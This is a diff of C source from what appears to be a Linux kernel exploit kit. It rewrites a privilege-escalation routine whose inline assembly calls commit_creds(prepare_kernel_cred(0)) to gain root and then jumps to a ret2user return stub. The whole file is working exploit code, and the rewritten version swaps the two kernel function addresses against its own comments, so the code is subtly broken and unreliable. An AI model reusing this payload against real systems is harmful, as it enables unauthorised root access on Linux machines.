@@ -1,37 +1,39 @@
 #include "privesc.h"
 #include "utils.h"
+#include <sys/types.h>
 
-/* Privesc from commit_creds(prepare_kernel_cred(NULL)); */
-void privesc_kcred(uintptr_t commit_creds,
-                   uintptr_t prepare_kernel_cred,
-                   void (*jmp_ret)(void))  // Function pointer to jump back
+#define __stringify(x) #x
+
+/* ============= 1 =============
+ * Privesc from kernel creds:
+ *      commit_creds(prepare_kernel_cred(0));
+ *
+ * We will need to use global variables in the assembly,
+ *      rather than passing locals to register.
+ *      Because the program will crash when certain regs are occupied
+ *      Even though we specify clobbers (but we don't know all)
+ * */
+void privesc_kcred(void)
 {
-    INFO("Running privesc from commit_creds(prepare_kernel_cred(0)");
-
     __asm__ __volatile__ (
         ".intel_syntax noprefix;\n"
-        "mov rdi, 0;\n"                     // rdi = NULL
-        "mov rax, %[pkc];\n"
-        "call rax;\n"                       // prepare_kernel_cred(NULL)
-        "mov rdi, rax;\n"                   // rdi = return value (cred)
-        "mov rax, %[cc];\n"
-        "call rax;\n"                       // commit_creds(cred)
-        "mov rax, %[ret];\n"
-        "jmp rax;\n"                        // jmp to ret2user_trampoline or any return stub
+        // prepare_kernel_cred*/
+        "movabs rax, " __stringify(COMMIT_CREDS_ADDR) ";"
+        "xor rdi, rdi;"
+        "call rax;"
+        "mov rdi, rax;"
+        // commit_creds*/
+        "movabs rax, " __stringify(PREPARE_KERNEL_CRED_ADDR) ";"
+        "call rax;"
+        "mov rax, " __stringify(PRIVESC_JUMP_ADDR) ";"
+        // jmp to ret2user_trampoline or any return stub
+        "jmp rax;"
         ".att_syntax;"
-        :
-        : [cc]  "r"(commit_creds),
-          [pkc] "r"(prepare_kernel_cred),
-          [ret] "r"(jmp_ret)
-        : "rax", "rdi"
     );
 }
 
-/* For debugging use */
-void test_ret_addr() {
-    __asm__ __volatile__ (
-        ".intel_syntax noprefix;\n"
-        "int3;\n"
-        ".att_syntax;\n"
-    );
-}
+
+
+
+
+
